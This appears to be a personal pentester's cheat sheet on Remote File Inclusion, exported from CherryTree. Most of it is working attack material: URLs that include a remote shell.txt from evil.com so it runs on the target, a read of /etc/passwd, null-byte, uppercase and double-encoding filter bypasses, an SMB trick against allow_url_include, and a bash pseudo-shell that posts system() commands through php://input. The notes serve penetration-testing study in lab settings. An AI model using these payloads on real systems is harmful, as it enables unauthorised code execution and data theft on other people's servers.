<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>RFI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Remote File Inclusion / RFI</h1></strong><br />Like LFI, Remote File Inclusion is where you can include files on a web server.<br />However, the difference is that with RFI you can include remote files i.e. files that exist on another web server.<br />For example, you could host a <code>.php</code> file on a server you own, include it on the target, and it will run on the target.<br /><br />Links<br />• <a href="https://awakened1712.github.io/oscp/oscp-lfi-rfi/">https://awakened1712.github.io/oscp/oscp-lfi-rfi/</a><br /><br /><strong>RFI, as far as my knowledge goes, is weird:</strong><br />• If you include a .php file on a remote host, it will run on the remote host<br />   ◇ <div class="codebox"><div class="codebox">root@evil:/var/www#&nbsp;nano&nbsp;phpinfo.php<br />&lt;?php<br />phpinfo()<br />?&gt;</div></div><br />   ◇ <code>http://target.com/index.php?page=http://evil.com/phpinfo.php</code> <br />   ◇ ^^ This will run phpinfo() on evil.com, not the target ^^<br /><br />• If you include a .txt file on a remote host that&#39;s ACTUALLY php code, it will run on the target host<br />   ◇ <div class="codebox"><div class="codebox">root@evil:/var/www#&nbsp;nano&nbsp;phpinfo.txt<br />&lt;?php<br />phpinfo()<br />?&gt;</div></div><br />   ◇ <code>http://target.com/index.php?page=http://evil.com/phpinfo.txt</code><br />   ◇ However, often to get this to work properly, you need a <code>%00</code><br />   ◇ <code>http://target.com/index.php?page=http://evil.com/phpinfo.txt%00</code> &lt;- WORKS<br /><br /><strong><h2>## RFI Payloads</h2></strong><br /><strong><h3>### Execute remote PHP code</h3></strong><br />First, check for code execution with <code>phpinfo()</code><br /><div class="codebox"><div class="codebox">root@evil:/var/www#&nbsp;nano&nbsp;phpinfo.txt<br />&lt;?php<br />phpinfo()<br />?&gt;</div></div><br /><br />Then move onto getting a shell (pentest-monkey, whatever)<br /><code>http://example.com/index.php?page=http://evil.com/shell.txt</code><br /><code>http://example.com/index.php?page=http://evil.com/shell.txt%00</code><br /><br /><strong><h3>### Read local files via RFI</h3></strong><br /><code>http://example.com/index.php?page=file:////etc/passwd</code><br /><br /><strong><h3>### Execute system commands</h3></strong><br /><code>php://input%00</code><br />The script below creates a pseudo-shell using the <code>php://input</code> wrapper<br /><div class="codebox"><div class="codebox">#!/bin/bash<br /><br />#URL=&quot;${1}&quot;<br />while&nbsp;true;do<br />&nbsp;echo&nbsp;-n&nbsp;&quot;$&nbsp;&quot;;&nbsp;read&nbsp;cmd<br />&nbsp;curl&nbsp;--silent&nbsp;-d&nbsp;&quot;&lt;?php&nbsp;system(&#39;echo&nbsp;BEGIN&#39;);&nbsp;system(&#39;${cmd}&#39;);&nbsp;system(&#39;echo&nbsp;END&#39;)&nbsp;?&gt;&quot;&nbsp;&#39;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&#39;&nbsp;|&nbsp;sed&nbsp;-n&nbsp;-e&nbsp;&#39;/BEGIN/,/END/&nbsp;p&#39;&nbsp;|&nbsp;tail&nbsp;-n&nbsp;+2&nbsp;|&nbsp;head&nbsp;-n&nbsp;-1<br />done</div></div><br /><br /><strong><h3>### Try LFI</h3></strong><br />If you&#39;ve found RFI, LFI most likely works too. <br />Refer to the LFI node and try all of those. It&#39;s still just file inclusion after all.<br /><br /><strong><h2>## Combatting Filters</h2></strong><br />Just LFI, developers might filter out bad characters that allow file inclusion to be exploited.<br />And just LFI, there are ways to bypass these filters.<br /><br /><strong><h3>### No input validation</h3></strong><br />This PHP code has no input filtering.<br /><div class="codebox"><div class="codebox">//&nbsp;The&nbsp;page&nbsp;we&nbsp;wish&nbsp;to&nbsp;display<br />$file&nbsp;=&nbsp;$_GET[&nbsp;&#39;page&#39;&nbsp;];</div></div><br /><br />You can just include the remote file/resource you want<br /><code>http://192.168.1.82/dvwa/vulnerabilities/fi/?page=http://google.com</code><br /><br /><strong><h3>### Mild Input Validation</h3></strong><br /><div class="codebox"><div class="codebox">//&nbsp;The&nbsp;page&nbsp;we&nbsp;wish&nbsp;to&nbsp;display<br />$file&nbsp;=&nbsp;$_GET[&nbsp;&#39;page&#39;&nbsp;];<br /><br />//&nbsp;Input&nbsp;validation<br />$file&nbsp;=&nbsp;str_replace(&nbsp;array(&nbsp;&quot;http://&quot;,&nbsp;&quot;https://&quot;&nbsp;),&nbsp;&quot;&quot;,&nbsp;$file&nbsp;);&nbsp;</div></div><br /><br />Here, this PHP code is filtering out <br />• <code>http://</code> <br />• <code>https://</code> <br /><br />Whilst this looks like effective filtering, only the specific strings specified are blocked.<br />You can get around this in a few ways:<br />• Using uppercase letters<br />   ◇ <code>http://192.168.1.82/dvwa/vulnerabilities/fi/?page=HTTP://google.com</code><br />• Double URL encoding<br />   ◇ <code>http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt</code><br /><br /><strong><h2>## Other Bypasses</h2></strong><br /><strong>Null byte</strong><br /><code>http://example.com/index.php?page=http://evil.com/shell.txt%00</code><br /><br /><strong>Windows - Bypass allow_url_include</strong><br />When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to <code>Off</code> it is still possible to include a remote file on Windows box using the <code>smb</code> protocol.<br />1. Create a share open to everyone<br />2. Write PHP code inside a file - <code>shell.php</code> - and copy it to your Windows SMB share<br />3. Include it <code>http://example.com/index.php?page=\\10.0.0.1\share\shell.php</code><br /></div>
</body>
</html>
